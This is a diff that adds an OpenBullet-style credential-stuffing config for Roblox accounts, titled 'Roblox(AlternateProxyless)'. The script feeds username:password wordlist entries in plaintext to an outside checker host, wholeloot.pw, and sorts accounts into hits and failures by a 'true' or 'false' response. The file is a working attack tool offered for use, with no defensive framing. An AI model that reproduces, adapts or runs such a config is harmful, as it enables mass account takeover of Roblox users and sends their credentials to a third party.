@@ -1,0 +1,38 @@
+[SETTINGS]
+{
+  "Name": "Roblox(AlternateProxyless)",
+  "SuggestedBots": 5,
+  "LastModified": "2018-05-20T18:36:57.2293956+02:00",
+  "AdditionalInfo": "",
+  "Author": "Nerox",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#LOGIN REQUEST GET "https://wholeloot.pw:8443/check?un=<USER>&pw=<PASS>" AutoRedirect=TRUE 
+  CONTENT "un=<USER>&pw=<PASS>" 
+  CONTENTTYPE "text/html; charset=UTF-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: http://wholeloot.pw/checker.php" 
+  HEADER "origin: http://wholeloot.pw" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "\"false\"" 
+  KEYCHAIN Success OR 
+    KEY "\"true\"" 
